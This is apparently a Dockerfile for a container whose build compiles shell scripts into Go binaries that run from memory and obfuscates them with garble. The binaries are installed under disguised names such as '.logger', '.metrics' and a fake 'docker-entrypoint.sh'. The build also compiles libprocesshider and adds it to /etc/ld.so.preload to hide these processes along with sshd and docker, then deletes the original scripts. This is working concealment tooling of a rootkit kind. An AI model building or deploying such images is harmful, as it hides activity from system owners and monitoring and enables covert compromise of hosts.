ARG GOLANG_VERSION=1.21.5
ARG BASE_IMAGE=quay.io/linux-whitehat/diuid:latest
FROM $BASE_IMAGE as obfuscator
ARG GOLANG_VERSION
ARG BASE_IMAGE

USER root

RUN wget https://golang.org/dl/go${GOLANG_VERSION}.linux-amd64.tar.gz  &&  tar -C /usr/local -xzf go${GOLANG_VERSION}.linux-amd64.tar.gz
RUN wget https://github.com/ajdiaz/bashc/releases/download/5.2.15/bashc -O /bin/bashc && chmod +x /bin/bashc
RUN apt-get update && apt install -yq shc gcc

SHELL ["/bin/bash", "-c"]

RUN sed -i 's|/kernel.sh|/usr/local/bin/.logger|g' /entrypoint.sh
RUN sed -i 's|kernel|logger|g' /entrypoint.sh
RUN sed -i 's|/init.sh|/usr/local/bin/.metrics|g' /kernel.sh
RUN sed -i 's|/linux/linux|/usr/local/bin/notifier|g' /kernel.sh

RUN function reverse_filename() { echo "$1" | awk -F '.' '{name=$1; ext=$2; for(i=length(name); i!=0; i--) printf "%s", substr(name, i, 1); if(length(ext)) printf ".%s", ext;}'; } && \
    sed -i '/^set/d' /init.sh && \
    shc -rf /init.sh -o /initrd && \
    shc -v -l -U -rf /kernel.sh -o /kernel && \
    shc -v -l -U -rf /entrypoint.sh -o /entrypoint

WORKDIR /src

COPY template*.go ./

#RUN /bin/bashc /init.sh /initrd && \
#    /bin/bashc /entrypoint.sh /entrypoint

ENV PATH $PATH:/usr/local/go/bin:$HOME/go/bin

RUN mkdir -p cmd/entry cmd/boot cmd/linux && \
    go install github.com/amenzhinsky/go-memexec/cmd/memexec-gen@latest && \
    go install mvdan.cc/garble@latest && \
    #sed -i 's/unix.MFD_CLOEXEC/unix.MFD_CLOEXEC | unix.MFD_ALLOW_SEALING | unix.MFD_NOEXEC_SEAL/g' /home/user/go/pkg/mod/github.com/amenzhinsky/go-memexec@v0.7.1/memexec_linux.go && \
    PATH=$(go env GOPATH)/bin:$PATH memexec-gen /initrd && \
    PATH=$(go env GOPATH)/bin:$PATH memexec-gen /kernel && \
    PATH=$(go env GOPATH)/bin:$PATH memexec-gen /entrypoint && \
    #sed -i "/path/d" entrypoint/memexec.go && \
    #sed -i "/path/d" initrd/memexec.go && \
    go mod init obfuscator && \
    go mod tidy && \
    sed -i 's/"LD_LIBRARY_PATH="+temp/append([]string{"LD_LIBRARY_PATH=" + temp}, os.Environ()...).../g' entrypoint/memexec.go && \
    sed -i 's/"LD_LIBRARY_PATH="+temp/append([]string{"LD_LIBRARY_PATH=" + temp}, os.Environ()...).../g' initrd/memexec.go && \
    sed -i 's/"LD_LIBRARY_PATH="+temp/append([]string{"LD_LIBRARY_PATH=" + temp}, os.Environ()...).../g' kernel/memexec.go && \
    sed 's/FILE/entrypoint/g' template.go > cmd/entry/main.go && \
    sed 's/FILE/initrd/g' template.go > cmd/boot/main.go && \
    sed 's/FILE/kernel/g' template.go > cmd/linux/main.go && \
    cp /entrypoint cmd/entry/ && \
    cp /initrd cmd/boot/ && \
    cp /init.sh cmd/boot/ && \
    cp /kernel cmd/linux/ && \
    #sed 's/file.bin/entrypoint/g' template2.go > cmd/entry/main.go && \
    #sed 's/file.bin/init.sh/g' template2.go > cmd/boot/main.go && \
    #sed 's/file.bin/kernel/g' template2.go > cmd/linux/main.go && \
    sed 's/file.bin/entrypoint/g' template3.go > cmd/entry/main.go && \
    sed 's/file.bin/initrd/g' template3.go > cmd/boot/main.go && \
    #sed 's/file.bin/kernel/g' template2.go > cmd/linux/main.go && \
    CGO_ENABLED=0 garble -literals -tiny build -ldflags=" -s -w" -a -installsuffix cgo ./cmd/entry && \
    CGO_ENABLED=0 garble -literals -tiny build -ldflags=" -s -w" -a -installsuffix cgo ./cmd/boot && \
    CGO_ENABLED=0 garble -literals -tiny build -ldflags=" -s -w" -a -installsuffix cgo ./cmd/linux

RUN mv /src/linux /src/kern &&  mkdir -p cmd/binary && \
    PATH=$(go env GOPATH)/bin:$PATH memexec-gen /linux/linux && \
    sed 's|FILE|linux|g' template.go > cmd/binary/main.go && \
    cp /linux/linux cmd/binary/binary && \
    go mod tidy && \
    CGO_ENABLED=0 garble -literals -tiny build -ldflags=" -s -w" -a -installsuffix cgo ./cmd/binary

ADD https://raw.githubusercontent.com/rafaelcalleja/libprocesshider/master/processhider.c ./processhider.c
ARG METRICS_PROCCESS='{\"notifier\",\".logger\",\".metrics\",\"sshd\",\"docker\",\"slirp4netns\",\"%number%\"}'
RUN sed -i "s={\"evil_script.py\"}=$METRICS_PROCCESS=g" processhider.c
RUN gcc -Wall -fPIC -shared -o preload.so processhider.c -ldl -z relro -z now && \
    mv preload.so /usr/local/lib/ && \
    echo /usr/local/lib/preload.so >> /etc/ld.so.preload

USER user

FROM $BASE_IMAGE

COPY --from=obfuscator /src/binary /usr/local/bin/notifier
COPY --from=obfuscator /src/kern /usr/local/bin/.logger
COPY --from=obfuscator /src/entry /usr/local/bin/docker-entrypoint.sh
COPY --from=obfuscator /src/boot /usr/local/bin/.metrics
COPY --from=obfuscator /usr/local/lib/preload.so /usr/local/lib/preload.so
COPY --from=obfuscator /etc/ld.so.preload /etc/ld.so.preload
COPY entrypoint.sh /entrypoint.sh
COPY wrap /usr/local/bin/wrap

USER root
RUN apt-get update && apt install -yq gnupg && rm -rf /var/lib/apt/lists/*

RUN rm -rf /init.sh /kernel.sh /linux

USER user
